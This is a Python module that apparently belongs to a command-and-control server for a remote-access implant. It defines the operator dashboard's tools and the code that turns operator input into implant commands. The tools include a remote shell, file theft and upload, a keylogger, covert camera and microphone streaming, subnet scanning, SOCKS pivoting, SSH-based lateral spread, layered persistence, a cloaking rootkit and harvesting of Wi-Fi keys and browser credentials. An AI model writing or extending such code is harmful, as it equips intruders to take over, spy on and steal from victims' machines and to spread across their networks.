"""Tool catalogue and result parsers.

The dashboard renders its operator panels from :func:`catalog`, so a tool only
has to be described once: the same entry drives the form, the API validation
and the result rendering. Every entry maps onto a command the implant
understands (see ``implant/exec.go``).

Nothing here touches global state; the server owns the sessions.
"""

import json
import re
from typing import Any, Dict, List, Optional

MAX_KEYLOG = 512 * 1024
KEYLOG_TAIL = 256 * 1024

FIELD_TYPES = ("text", "number", "select", "toggle", "path")


def _field(name, label, ftype="text", **extra) -> dict:
    out = {"name": name, "label": label, "type": ftype}
    out.update(extra)
    return out


# ---------------------------------------------------------------- catalogue

TOOL_GROUPS = [
    {"id": "control", "label": "Control", "blurb": "Hands on the host"},
    {"id": "intel", "label": "Recon", "blurb": "Read the target"},
    {"id": "surveillance", "label": "Surveillance", "blurb": "See and hear it"},
    {"id": "persist", "label": "Persistence", "blurb": "Keep the foothold"},
    {"id": "opsec", "label": "Opsec", "blurb": "Stay unseen"},
    {"id": "network", "label": "Network", "blurb": "Move and pivot"},
]

TOOLS: List[dict] = [
    {
        "id": "console",
        "label": "Command console",
        "icon": "i-term",
        "group": "control",
        "mode": "console",
        "blurb": "Run shell commands and watch results stream back on the next beacon.",
        "command": "shell",
        "args": [{"name": "cmd", "from": "raw"}],
        "returns": "text",
    },
    {
        "id": "files",
        "label": "File browser",
        "icon": "i-folder",
        "group": "control",
        "mode": "files",
        "blurb": "Browse, download, upload and delete files on the target.",
        "returns": "files",
        "args": [
            _field("path", "Path", "text", required=True),
            _field("sub", "Action", "select", default="ls",
                   options=["ls", "get", "put", "rm", "mkdir"]),
            _field("b64", "Payload", "text"),
        ],
    },
    {
        "id": "processes",
        "label": "Processes",
        "icon": "i-cpu",
        "group": "control",
        "mode": "processes",
        "blurb": "Live process table; terminate anything the operator account can reach.",
        "command": "ps",
        "returns": "processes",
        "actions": [
            {"id": "kill", "label": "Kill", "command": "killproc",
             "args": [_field("pid", "PID", "number", required=True)]},
        ],
    },
    {
        "id": "keylog",
        "label": "Keylogger",
        "icon": "i-key",
        "group": "surveillance",
        "mode": "keylog",
        "blurb": "Continuous keystroke capture. Dumps collect automatically while it runs.",
        "command": "keylog",
        "returns": "keylog",
    },
    {
        "id": "surveillance",
        "label": "Camera & mic",
        "icon": "i-cam",
        "group": "surveillance",
        "mode": "media",
        "blurb": "Live MJPEG camera and 16 kHz microphone, plus one-shot captures.",
        "returns": "media",
        "args": [
            _field("sub", "Action", "select", default="cam_start",
                   options=["cam_start", "cam_stop", "mic_start", "mic_stop",
                            "snapshot", "webcam", "mic_clip", "devices"]),
            _field("device", "Device", "text"),
            _field("fps", "FPS", "number", default=2),
            _field("width", "Width", "number", default=640),
            _field("secs", "Seconds", "number", default=5),
        ],
    },
    {
        "id": "network",
        "label": "Network scan",
        "icon": "i-network",
        "group": "network",
        "mode": "scan",
        "blurb": "TCP sweep of the local subnet and the host's own socket table.",
        "command": "scan",
        "args": [
            _field("subnet", "Subnet", "text", placeholder="10.20.4 (blank = local /24)"),
            _field("ports", "Ports", "text", default="22,80,443,445,3389,8080"),
        ],
        "returns": "scan",
    },
    {
        "id": "socks",
        "label": "SOCKS pivot",
        "icon": "i-share",
        "group": "network",
        "mode": "pivot",
        "blurb": "Route tooling through the host over the beacon channel.",
        "command": "socks",
        "returns": "text",
    },
    {
        "id": "spread",
        "label": "Lateral spread",
        "icon": "i-up",
        "group": "network",
        "mode": "form",
        "blurb": "Copy the implant to other hosts over SSH and start it detached.",
        "command": "spread",
        "args": [
            _field("targets", "Targets", "text", wide=True,
                   placeholder="10.20.4.20, 10.20.4.21 — blank scans port 22"),
            _field("user", "User", "text", default="root"),
            _field("pass", "Password", "text", placeholder="needs sshpass"),
        ],
        "returns": "text",
    },
    {
        "id": "persistence",
        "label": "Persistence",
        "icon": "i-anchor",
        "group": "persist",
        "mode": "persist",
        "blurb": "Stacked reboot survival: Run key + logon task + startup folder, "
                 "or systemd + cron + profile hook.",
        "command": "persist",
        "args": [
            _field("sub", "Method", "select", default="auto",
                   options=["auto", "systemd", "cron", "registry", "task",
                            "startup", "remove"]),
        ],
        "returns": "text",
    },
    {
        "id": "recon",
        "label": "Host recon",
        "icon": "i-info",
        "group": "intel",
        "mode": "tool",
        "blurb": "Installed AV/EDR, users, ARP, routes, Wi-Fi keys, credential "
                 "stores and software inventory.",
        "command": "recon",
        "args": [
            _field("sub", "Collect", "select", default="av",
                   options=["av", "users", "arp", "route", "env", "wifi",
                            "browsers", "software", "boot"]),
        ],
        "returns": "text",
    },
    {
        "id": "stealth",
        "label": "Stealth status",
        "icon": "i-ghost",
        "group": "opsec",
        "mode": "tool",
        "blurb": "Sandbox score, session crypto, callback path and worker count "
                 "for this host.",
        "command": "stealth",
        "args": [],
        "returns": "text",
    },
    {
        "id": "rootkit",
        "label": "Rootkit / cloaking",
        "icon": "i-ghost",
        "group": "persist",
        "mode": "rootkit",
        "blurb": "Linux LKM install or Windows hidden-copy cloaking.",
        "command": "rootkit",
        "args": [
            _field("sub", "Action", "select", default="status",
                   options=["status", "install", "remove"]),
            _field("name", "Masquerade name", "text", placeholder="WinSync"),
        ],
        "returns": "text",
    },
    {
        "id": "info",
        "label": "Host profile",
        "icon": "i-info",
        "group": "intel",
        "mode": "info",
        "blurb": "Reported identity, beacon timing and operator annotations.",
        "returns": "info",
    },
]

BY_ID = {t["id"]: t for t in TOOLS}


def catalog() -> dict:
    """Everything the dashboard needs to render the tool rails."""
    return {
        "groups": TOOL_GROUPS,
        "tools": [dict(t, args=t.get("args", [])) for t in TOOLS],
    }


# ---------------------------------------------------------------- validation

def _coerce(field: dict, value: Any) -> Any:
    kind = field["type"]
    if kind == "number":
        if value in (None, ""):
            if field.get("required"):
                raise ValueError(f"{field['label']} is required")
            return field.get("default")
        try:
            return int(value)
        except (TypeError, ValueError):
            raise ValueError(f"{field['label']} must be a number")
    if kind == "select":
        opts = field.get("options") or []
        value = str(value or field.get("default") or (opts[0] if opts else ""))
        if opts and value not in opts:
            raise ValueError(f"{field['label']}: pick one of {', '.join(opts)}")
        return value
    if kind == "toggle":
        return str(value).lower() in ("1", "true", "on", "yes")
    text = "" if value is None else str(value)
    if field.get("required") and not text.strip():
        raise ValueError(f"{field['label']} is required")
    return text


def build_args(tool_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """Validate operator input and return the implant args dict."""
    tool = BY_ID.get(tool_id)
    if tool is None:
        raise ValueError(f"unknown tool: {tool_id}")
    args: Dict[str, Any] = {}
    for field in tool.get("args", []):
        if field.get("from") == "raw":
            args[field["name"]] = str(payload.get(field["name"]) or "")
            continue
        if field["name"] == "b64":
            continue
        args[field["name"]] = _coerce(field, payload.get(field["name"]))
    return args


# tool action -> (implant command type, args)
_SURVEILLANCE = {
    "cam_start": ("cam_stream", {}),
    "cam_stop": ("cam_stream", {"sub": "stop"}),
    "mic_start": ("mic_stream", {}),
    "mic_stop": ("mic_stream", {"sub": "stop"}),
    "snapshot": ("screenshot", {}),
    "webcam": ("webcam", {}),
    "mic_clip": ("mic", {}),
    "devices": ("devices", {}),
}
_FILES = {"ls": "lsjson", "get": "download", "put": "upload",
          "rm": "rm", "mkdir": "mkdir"}


def command_for(tool_id: str, payload: Dict[str, Any]):
    """Resolve operator input into ``(command_type, args)`` for the implant."""
    tool = BY_ID.get(tool_id)
    if tool is None:
        raise ValueError(f"unknown tool: {tool_id}")
    action = str(payload.get("action") or payload.get("sub") or "").strip()

    if tool_id == "keylog":
        sub = action or "dump"
        if sub not in ("start", "stop", "dump", "status"):
            raise ValueError("keylog action must be start, stop, dump or status")
        return "keylog", {"sub": sub, "clear": str(payload.get("clear") or "")}

    if tool_id == "files":
        sub = action or "ls"
        if sub not in _FILES:
            raise ValueError("file action must be ls, get, put, rm or mkdir")
        args = {"path": _coerce(tool["args"][0], payload.get("path"))}
        if sub == "put":
            b64 = str(payload.get("b64") or "")
            if not b64:
                raise ValueError("nothing to upload")
            args["b64"] = b64
        return _FILES[sub], args

    if tool_id == "surveillance":
        sub = action or "cam_start"
        if sub not in _SURVEILLANCE:
            raise ValueError(f"unknown surveillance action: {sub}")
        cmd, extra = _SURVEILLANCE[sub]
        args = dict(extra)
        if sub == "cam_start":
            args["fps"] = _coerce(tool["args"][2], payload.get("fps"))
            args["width"] = _coerce(tool["args"][3], payload.get("width"))
            args["device"] = str(payload.get("device") or "")
        if sub == "mic_start":
            args["device"] = str(payload.get("device") or "")
        if sub == "mic_clip":
            args["secs"] = _coerce(tool["args"][4], payload.get("secs"))
        return cmd, args

    if tool_id == "processes":
        if action == "kill":
            pid = _coerce(tool["actions"][0]["args"][0], payload.get("pid"))
            return "killproc", {"pid": pid}
        return "ps", {}

    if tool_id == "socks":
        return "socks", {"sub": action or "start"}

    return tool.get("command", tool_id), build_args(tool_id, payload)


# ---------------------------------------------------------------- parsers

_TASKLIST_ROW = re.compile(
    r"^(?P<name>.{1,25}?)\s+(?P<pid>\d+)\s+(?P<session>.{1,16}?)\s+"
    r"(?P<num>\d+)\s+(?P<mem>[\d.,]+ ?[A-Za-z]*)")
_PSAUX_ROW = re.compile(
    r"^(?P<user>\S+)\s+(?P<pid>\d+)\s+(?P<cpu>[\d.]+)\s+(?P<mem>[\d.]+)\s+"
    r"\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+(?P<cmd>.+)$")


def parse_processes(out: str) -> List[dict]:
    rows: List[dict] = []
    for line in (out or "").splitlines():
        line = line.rstrip()
        if not line or line.startswith("Image Name") or line.startswith("===") \
                or line.startswith("USER ") or line.startswith("PID"):
            continue
        m = _PSAUX_ROW.match(line)
        if m:
            rows.append({"user": m.group("user"), "pid": int(m.group("pid")),
                         "cpu": float(m.group("cpu")), "mem": float(m.group("mem")),
                         "command": m.group("cmd").strip()})
            continue
        m = _TASKLIST_ROW.match(line)
        if m:
            rows.append({"user": "", "pid": int(m.group("pid")),
                         "cpu": None, "mem": m.group("mem").strip(),
                         "command": m.group("name").strip()})
    rows.sort(key=lambda r: (r["cpu"] is None, -(r["cpu"] or 0)))
    return rows[:600]


def parse_json_list(out: str) -> List[dict]:
    try:
        data = json.loads(out or "[]")
    except ValueError:
        return []
    return data if isinstance(data, list) else []


def parse_scan(out: str) -> List[dict]:
    hosts = []
    for row in parse_json_list(out):
        if isinstance(row, dict) and row.get("ip"):
            ports = row.get("ports") or []
            hosts.append({"ip": str(row["ip"]),
                          "ports": [int(p) for p in ports if str(p).isdigit()]})
    return hosts


def parse_files(out: str) -> List[dict]:
    rows = []
    for row in parse_json_list(out):
        if isinstance(row, dict) and row.get("name") is not None:
            rows.append({"name": str(row["name"]), "size": int(row.get("size") or 0),
                         "dir": bool(row.get("dir"))})
    rows.sort(key=lambda r: (not r["dir"], r["name"].lower()))
    return rows


def parse_result(kind: Optional[str], out: str) -> dict:
    """Shape a raw result for the dashboard. Unknown kinds stay text."""
    if kind == "processes":
        return {"format": "processes", "processes": parse_processes(out)}
    if kind == "scan":
        return {"format": "scan", "hosts": parse_scan(out)}
    if kind == "files":
        return {"format": "files", "entries": parse_files(out)}
    return {"format": "text", "text": out or ""}


def trim_keylog(buffer: str) -> str:
    if len(buffer) <= MAX_KEYLOG:
        return buffer
    return buffer[-KEYLOG_TAIL:]


def keylog_lines(buffer: str) -> List[str]:
    """Split the raw capture into readable lines, honouring backspace."""
    text = (buffer or "").replace("\r\n", "\n").replace("\b", "")
    return text.split("\n")
